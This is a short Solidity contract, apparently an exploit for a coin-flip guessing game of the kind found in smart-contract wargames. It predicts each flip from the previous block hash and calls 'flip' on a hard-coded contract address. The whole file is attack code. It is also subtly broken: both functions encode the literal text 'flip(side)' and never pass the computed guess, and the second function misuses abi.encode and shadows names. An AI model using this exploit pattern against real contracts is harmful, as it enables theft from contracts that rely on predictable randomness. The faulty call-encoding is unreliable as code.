pragma solidity 0.6.0;
contract exp{
    address public v=0xDA30D81Fc582768b238f02A83bAf3922B995000c;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
    function c() public{
        uint256 blockValue = uint256(blockhash(block.number-1));
        uint256 coinFlip = blockValue/FACTOR;
        bool side = coinFlip == 1 ? true : false;
        bytes memory payload = abi.encodeWithSignature("flip(side)");
        (bool success, bytes memory returnData) = address(v).call(payload);
    }
    function x() public{
        uint256 blockValue = uint256(blockhash(block.number-1));
        uint256 coinFlip = blockValue/FACTOR;
        bool side = coinFlip == 1 ? true : false;
        (bool x,bytes memory y)=address(v).call(bytes(abi.encode("flip(side)")));
    }
}